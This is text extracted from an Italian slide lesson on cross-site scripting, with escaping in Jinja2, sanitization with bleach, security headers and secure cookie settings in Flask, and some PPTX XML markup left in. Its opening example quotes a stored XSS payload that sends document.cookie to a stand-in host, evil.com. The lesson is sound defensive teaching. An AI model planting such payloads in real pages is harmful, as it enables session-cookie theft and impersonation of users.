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XSS e header HTTP di sicurezza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JavaScript dell'attaccante nel browser della vittima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5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Cos'è Cross-Site Scripting (XSS) e i suoi 3 tipi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Eseguire XSS Reflected e XSS Stored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Difendersi con escape automatico (Jinja2)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Conoscere i 6 header HTTP di sicurezza fondamentali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Configurare cookie sicuri (Secure, HttpOnly, SameSite)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📖  Una storia: il commento 'rilanciato'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00A0B0"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Senza chiedere password, l'attaccante ha l'identità della vittima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Immagina un forum dove gli utenti pubblicano commenti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Un utente cattivo pubblica un commento che CONTIENE codice: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'Bel post! &lt;script&gt;fetch("evil.com?c="+document.cookie)&lt;/script&gt;'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Il forum lo salva pensando sia testo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Quando un altro utente apre la pagina, il SUO browser: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1. Legge il commento dal DB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2. Trova &lt;script&gt;...&lt;/script&gt; e lo ESEGUE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3. Manda il SUO cookie di sessione all'attaccante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Georgia"/>
              </a:rPr>
              <a:t>XSS = il JavaScript dell'attaccante eseguito nel browser della tua vittima.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1828800" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="381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🌐  Come funziona un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Scarica HTML della pagina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Applica CSS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Trova tag &lt;script&gt; e li ESEGUE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Permette al JS di accedere a DOM, cookie, fare richieste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Se l'attaccante riesce a far eseguire del SUO JS nella tua pagina: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→ ha accesso a cookie sessione, dati form, può agire come l'utente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 3 tipi di XSS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REFLECTED — il payload è nell'URL, riflesso nella pagina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Vittima: chi clicca il link malevolo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STORED — il payload è salvato nel DB (commenti, post)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Vittima: chiunque visita la pagina (più grave)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DOM-BASED — JS della pagina prende valore da location.hash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Più raro, più subdolo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Flusso di un attacco XSS Stored</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="cap5_x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Dal commento malevolo al furto del cookie di sessione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Difesa: escape automatico (Jinja2)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JINJA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jinja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&lt;!-- Template Jinja2 --&gt;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&lt;h1&gt;Risultati per: {{ query }}&lt;/h1&gt;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Se query = "&lt;script&gt;alert(1)&lt;/script&gt;"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Jinja2 trasforma in: &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;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Il browser mostra come TESTO, NON esegue → XSS neutralizzata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Equivalenti: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Java + Thymeleaf:  &lt;span th:text="${query}"&gt;&lt;/span&gt;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PHP + Twig:        {{ query }}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React:             {query}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Default escape è SEMPRE attivo. Non disabilitarlo con |safe.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⚠  Il pericolo del |safe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Jinja2: {{ comment | safe }}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Disabilita l'escape → XSS GARANTITA su input utente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Equivalenti pericolosi in altri framework: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Vue: v-html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React: dangerouslySetInnerHTML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Blade: {!! $x !!}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Usali solo su testo statico che hai scritto TU.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Mai, MAI, MAI su input utente.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Quando l'utente DEVE scrivere HTML ricco: bleach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Scenario: commenti con grassetto/corsivo/link → escape NON va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Soluzione: sanitization con bleach (whitelist tag+attributi)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import bleach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ALLOWED_TAGS = ["p", "b", "strong", "i", "em", "a", "br"]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ALLOWED_ATTRS = {"a": ["href"]}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ALLOWED_PROTO = ["http", "https"]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safe_html = bleach.clean(user_html,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        tags=ALLOWED_TAGS,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        attributes=ALLOWED_ATTRS,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        protocols=ALLOWED_PROTO,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        strip=True)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Input:  &lt;p&gt;Ciao &lt;script&gt;alert(1)&lt;/script&gt;&lt;a href="javascript:.."&gt;x&lt;/a&gt;&lt;/p&gt;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Output: &lt;p&gt;Ciao &lt;a&gt;x&lt;/a&gt;&lt;/p&gt;     ← script rimosso, href javascript: rimosso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bleach mantiene tag voluti, butta tutto il resto. JS in DOMPurify.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Header HTTP di sicurezza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Configurazione rapida, difese potenti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 6 header di sicurezza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Header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Cosa fa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Strict-Transport-Security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Forza HTTPS dopo prima visita (HSTS)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Content-Security-Policy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Limita risorse caricabili (anti-XSS L2)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X-Frame-Options: DENY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Blocca clickjacking via iframe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X-Content-Type-Options: nosniff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Blocca MIME sniffing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Referrer-Policy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Controlla cosa va nel Referer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Permissions-Policy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Limita API browser (camera, mic)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Cookie sicuri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Configurazione Flask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app.config.update(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SESSION_COOKIE_SECURE=True,      # Solo HTTPS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SESSION_COOKIE_HTTPONLY=True,     # JS NON può leggerlo (anti-XSS)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SESSION_COOKIE_SAMESITE="Lax",    # Anti-CSRF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PERMANENT_SESSION_LIFETIME=3600,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Risultato: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Set-Cookie: session=abc;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          Secure; HttpOnly; SameSite=Lax;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          Path=/; Max-Age=3600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3 attributi + 1 config = -90% rischio session hijacking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XSS = JavaScript dell'attaccante eseguito nel browser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3 tipi: Reflected, Stored (peggiore), DOM-based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Jinja2 fa escape di default — NON disabilitarlo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Per HTML ricco voluto: bleach con whitelist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Cookie sessione: Secure + HttpOnly + SameSite (sempre)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Lab + sicurezza headers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Test del proprio sito con securityheaders.com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L6 — Input validation + Supply chain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L5  ·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